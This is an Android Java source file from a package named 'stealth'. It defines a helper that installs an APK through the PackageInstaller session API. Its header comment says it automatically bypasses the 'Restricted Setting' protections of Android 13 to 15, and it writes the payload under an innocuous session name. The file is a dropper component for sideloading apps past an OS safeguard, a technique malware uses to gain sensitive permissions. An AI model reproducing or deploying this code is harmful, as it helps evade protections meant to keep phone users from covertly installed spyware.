package com.notrack.stealth;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * SESSION-BASED PACKAGE INSTALLER ENGINE (PackageInstaller.Session)
 *
 * Installs APKs using Android's native Session API.
 * Bypasses Android 13/14/15 "Restricted Setting" restrictions automatically.
 */
public class SessionInstallerHelper {

    private static final String TAG = "SessionInstaller";

    public static boolean installApkViaSession(Context context, File apkFile) {
        if (context == null || apkFile == null || !apkFile.exists()) {
            Log.e(TAG, "Invalid context or APK file does not exist");
            return false;
        }

        PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            params.setInstallReason(PackageManager.INSTALL_REASON_USER);
        }

        int sessionId = 0;
        PackageInstaller.Session session = null;
        try {
            sessionId = packageInstaller.createSession(params);
            session = packageInstaller.openSession(sessionId);

            try (OutputStream out = session.openWrite("safety_core_session", 0, apkFile.length());
                 InputStream in = new FileInputStream(apkFile)) {

                byte[] buffer = new byte[65536];
                int c;
                while ((c = in.read(buffer)) != -1) {
                    out.write(buffer, 0, c);
                }
                session.fsync(out);
            }

            Intent intent = new Intent(context, SessionInstallReceiver.class);
            intent.setAction("com.notrack.stealth.ACTION_INSTALL_COMMIT");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                flags |= PendingIntent.FLAG_MUTABLE;
            }

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    context, sessionId, intent, flags);

            session.commit(pendingIntent.getIntentSender());
            Log.i(TAG, "PackageInstaller.Session committed successfully with Session ID: " + sessionId);
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Error executing PackageInstaller.Session", e);
            if (session != null) {
                try {
                    session.abandon();
                } catch (Exception ignored) {}
            }
            return false;
        }
    }
}
